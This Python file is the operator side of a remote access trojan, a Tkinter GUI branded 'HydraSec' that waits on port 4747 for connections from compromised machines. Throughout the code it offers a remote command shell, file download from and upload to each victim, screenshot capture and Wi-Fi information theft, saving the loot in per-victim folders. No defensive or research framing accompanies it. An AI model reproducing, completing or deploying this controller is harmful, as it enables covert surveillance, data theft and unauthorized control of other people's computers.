from tkinter import *
import socket
import os
import threading
import datetime
import time
from queue import Queue
from tkinter import messagebox

NUMBER_OF_THREADS = 3
JOBS_NUMBER = [1, 2, 3]
queue = Queue()
all_connections = []
all_addresses = []

def socket_create():
    try:
        global host
        global port
        global s
        host = ""
        port = 4747
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def socket_bind():
    try:
        global host
        global port
        global s
        messagebox.showinfo("INFO","Server is starting...")
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()

def accept_connections():
    global address
    global conn
    running = True
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while running:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            messagebox.showinfo("INFO","Connection has been established with: " + address[0])
            list_connection()
        except:
            running = False

def start_shell():
    j = 0
    while j < 7:
        get_target(j)
        j += 1
    

def close(conn, ip, sh, dis, i):
    ip.destroy()
    sh.destroy()
    dis.destroy()
    try:
        screen1.destroy()
    except:
        pass
    conn.send("CLOSEALL".encode())
    del all_connections[i]
    del all_addresses[i]



def list_connection():
    global directory
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        
        
    ip = Label(screen, text = "Address:  " + str(all_addresses[i][0]) + "  Port:  " + str(all_addresses[i][1]), font = ("Arial", 9, "bold"), bg = "white", fg = "black")
    ip.place(x = 20, y = 46 + i * 40)
    sh = Button(screen, text = "Open Shell", font = ("Arial", 9, "bold"), bg = "white", fg = "black", cursor = "hand2", command=lambda : control(conn))
    sh.place(x = 300, y = 40 + i * 40)
    dis = Button(screen, text = "Disconnect", font = ("Arial", 9, "bold"), bg = "white", fg = "black", cursor = "hand2", command=lambda : close(conn, ip, sh, dis, i))
    dis.place(x=400, y = 40 + i * 40)
    directory = str(all_addresses[i][0] + " - " + str(all_addresses[i][1]))
    os.mkdir(directory)

def get_target(j):
    global target
    try:
        target = j
        conn = all_connections[target]
        return conn
    except:
        return None

def send_target_commands(conn):
    command_line = console_in.get()
    console_in.delete(0, END)
    
    if command_line == str(""):
        conn.send(" ".encode())

    if command_line[:8] == "download":
        conn.send(command_line[:8].encode())
        filename = command_line[8:].strip()
        conn.send(filename.encode())
        err = conn.recv(1024).decode("utf-8")
        if err[:6] == 'EXISTS':
            filesize = int(err[6:])
            conn.send(str.encode('OK'))
            f = open(directory + "/" + filename, 'wb')
            err = conn.recv(1024)
            totalRecv = len(err)
            f.write(err)
            while totalRecv < filesize:
                err = conn.recv(1024)
                totalRecv += len(err)
                f.write(err)
            f.close()
            screen.iconify()
            messagebox.showinfo("INFO", "File downloaded successfully!") 
            
        else:
            screen.iconify()
            messagebox.showerror("ERR", "File not exist!")

    

    if command_line[:6] == "upload":
        conn.send(command_line[:6].encode())
        filename = command_line[6:].strip()
        if os.path.isfile(filename):
            conn.send(filename.encode())
            time.sleep(0.1)
            conn.send(str.encode('EXISTS' + str(os.path.getsize(filename))))
            userResp = conn.recv(1024)
            userRespd = userResp.decode('utf-8')
            if userRespd[:2] == 'OK':
                with open(filename, 'rb') as f:
                    byteSend = f.read(1024)
                    conn.send(byteSend)
                    while byteSend != b'':
                        byteSend = f.read(1024)
                        conn.send(byteSend)
                screen.iconify()
                messagebox.showinfo("INFO", "File uploaded successfully!")
        else:
            screen.iconify()
            conn.send("ERR".encode())
            messagebox.showerror("ERR", "File not exist!")
   
        
    received = True
    while received:
        try:
            conn.send(str.encode(command_line))
            data = conn.recv(20480).decode("utf-8")
            if data != "":
                console_out.configure(state="normal")
                console_out.insert(END, command_line + "\n" + data)
                console_out.see(END)
                console_out.configure(state="disabled")
                received = False
    
        except ConnectionResetError:
            messagebox.showerror("ERROR", "Connection was lost!")
            break



def on_exit():
    if messagebox.askyesno("Exit", "Are you sure?"):
        screen.destroy()
        os._exit(0)


def scr():
    global screen
    screen = Tk()
    screen.protocol('WM_DELETE_WINDOW', on_exit)
    screen.title("HydraSec - v3.5")
    screen.resizable(0, 0)
    #screen.iconbitmap("hydra.ico")
    screen.configure(bg = "white")
    w = 900
    h = 500
    ws = screen.winfo_screenwidth() 
    hs = screen.winfo_screenheight() 
    x = (ws/2) - (w/2)
    y = (hs/2) - (h/2)
    screen.geometry('%dx%d+%d+%d' % (w, h, x, y))
    Label(screen, text = "Controlled Machine:", font = ("Arial", 9, "bold"), bg = "white", fg = "black").place(x = 20, y = 20)
    Label(screen, text = "Neptune Security - © 2024", height="3", font = ("Arial", 9, "bold"), bg = "white", fg = "black").place(x=380, y=450)
    screen.mainloop()

def control(conn):
    global screen1
    screen1 = Tk()
    screen1.title(f"HydraSec - Address: " + str(conn.getpeername()).replace("(", "").replace(")", "").replace("'", "").replace(","," - Port:"))
    screen1.resizable(0, 0)
    #screen1.iconbitmap("hydra.ico")
    screen1.configure(bg = "white")
    w = 1280
    h = 830
    ws = screen1.winfo_screenwidth() 
    hs = screen1.winfo_screenheight() 
    x = (ws/2) - (w/2)
    y = (hs/2) - (h/2)
    screen1.geometry('%dx%d+%d+%d' % (w, h, x, y))

    global console_in

    global console_out
       
    console_out = Text(screen1, font = ("Arial", 9, "bold"), width = 175, height = 36, bg = "white", fg = "black", insertbackground="white")
    console_out.grid(row=0, column=0, padx=25, pady=25)

    
    console_in = Entry(screen1, font = ("Arial", 9, "bold"), width=175, bg="white", fg="black", insertbackground="black", disabledbackground="white")
    console_in.grid(row=1, column=0)
    console_in.focus_set()
   
    console_in.bind("<Return>", (lambda event: send_target_commands(conn)))
    
    conn.send("prompt".encode())
    data = conn.recv(1024).decode("utf-8")
    console_out.configure(state="normal")
    console_out.insert(1.0, "Commands for shell:\ndownload <name file> - Download file\nupload <name file> - Upload file\n\n" + data)
    console_out.configure(state="disabled")
    
    Button(screen1, text = "Screenshot", height = "2", width = "13", font = ("Arial", 9, "bold"), bg = "white", fg = "black", cursor = "hand2", command = lambda : takeScreenshot(conn)).place(x=360, y=720)
    Button(screen1, text = "File Dump", height = "2", width = "13", font = ("Arial", 9, "bold"), bg = "white", fg = "black", cursor = "hand2", command = saveDumpFile).place(x=580, y=720)
    Button(screen1, text = "Get Wifi Info", height = "2", width = "13", font = ("Arial", 9, "bold"), bg = "white", fg = "black", cursor = "hand2", command = lambda : takeGetWifi(conn)).place(x=800, y=720)
    Label(screen1, text = "Neptune Security - © 2024", height="3", font = ("Arial", 9, "bold"), bg = "white", fg = "black").place(x=564, y=780)
    screen1.mainloop()
   
    


def saveDumpFile():
    time_stamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    with open(f"{directory}/filedump-{directory}-{time_stamp}.txt", "w") as f:
        f.write(console_out.get(1.0, END))
    screen.iconify()
    messagebox.showinfo("INFO", "File dump saved successfully!")



def takeScreenshot(conn):
    time_stamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    conn.send("screenshot".encode())
    err = conn.recv(1024).decode("utf-8")
    if err[:6] == 'EXISTS':
        filesize = int(err[6:])
        conn.send(str.encode('OK'))
        f = open(directory + "/" + 'screenshot-' + time_stamp + '.png', 'wb')
        err = conn.recv(1024)
        totalRecv = len(err)
        f.write(err)
        while totalRecv < filesize:
            err = conn.recv(1024)
            totalRecv += len(err)
            f.write(err)
        f.close()
        screen.iconify()
        messagebox.showinfo("INFO", "Screenshot saved successfully!")

        


def takeGetWifi(conn):
    time_stamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    conn.send("get_wifi".encode())
    err = conn.recv(1024).decode("utf-8")
    if err == "err":
        screen.iconify()
        messagebox.showerror("ERR", "This tool work only on Windows!")
    if err == "errw":
        screen.iconify()
        messagebox.showerror("ERR", "WIFI device not detected!")
    if err[:6] == 'EXISTS':
        filesize = int(err[6:])
        conn.send(str.encode('OK'))
        f = open(directory + "/" + 'wifi-' + time_stamp + '.txt', 'wb')
        err = conn.recv(1024)
        totalRecv = len(err)
        f.write(err)
        while totalRecv < filesize:
            err = conn.recv(1024)
            totalRecv += len(err)
            f.write(err)
        f.close()
        screen.iconify()
        messagebox.showinfo("INFO", "WIFI File saved successfully")





def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.start()

def work():
        x = queue.get()
        if x == 1:
            scr()
        if x == 2:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 3:
            start_shell()
        queue.task_done()
       



def create_jobs():
    for x in JOBS_NUMBER:
        queue.put(x)
    queue.join()




if __name__ == "__main__":
    create_workers()
    create_jobs()
